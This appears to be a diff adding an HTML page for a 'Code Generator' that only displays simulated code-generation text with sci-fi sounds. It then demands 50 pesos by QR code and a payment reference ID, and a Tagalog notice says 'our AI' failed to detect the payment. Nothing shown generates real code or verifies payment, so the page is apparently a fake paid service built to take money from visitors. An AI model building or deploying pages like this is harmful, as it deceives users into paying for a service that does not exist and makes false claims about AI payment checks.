@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Code Generator</title>
+    <link rel="stylesheet" href="typer.css">
+    <style>
+        html, body {
+            overflow: hidden;
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+    </style>
+</head>
+<body>
+    <audio id="bgMusic" loop>
+        <source src="ytmp3free.cc_binary-code-interface-sound-effects-scifi-computer-beeps-data-processing-sounds-youtubemp3free.org.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+
+    <div id="paymentStatusNotification" class="notification-center hidden">
+        <p>Oops! Hindi na detected ng aming Ai ang iyong BAYAD</p>
+    </div>
+
+    <div class="container">
+        <div class="input-container">
+            <div class="input-content">
+                <div class="input-dist">
+                    <div class="input-type">
+                        <h2>Generating Code...</h2>
+                        <p id="pastedLink"></p>
+                        <pre id="generatedCode">// Simulating code generation...</pre>
+
+                        <div id="paymentMessage" class="hidden">
+                            <p>To continue generating code, please pay 50 pesos.</p>
+                            <p>Scan the QR code below:</p>
+                            <img src="myqr_1747551909229.jpg" alt="Payment QR Code" id="qrCode">
+                            <p>After payment, refresh the page to continue.</p>
+                            
+                            <div id="referenceIdSection">
+                                <input type="text" id="referenceId" placeholder="Enter 12-digit Reference ID" maxlength="12">
+                                <p id="referenceIdError" class="error-message"></p>
+                                <button id="submitReferenceId">Submit Reference ID</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script>
+        // Auto-play background music when page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            const bgMusic = document.getElementById('bgMusic');
+            bgMusic.play().catch(function(error) {
+                console.log("Audio play failed:", error);
+            });
+
+            // Add click event to document to enable audio on user interaction
+            document.addEventListener('click', function() {
+                bgMusic.play().catch(function(error) {
+                    console.log("Audio play failed:", error);
+                });
+            }, { once: true });
+        });
+    </script>
+    <script src="typer.js"></script>
+</body>
+</html>
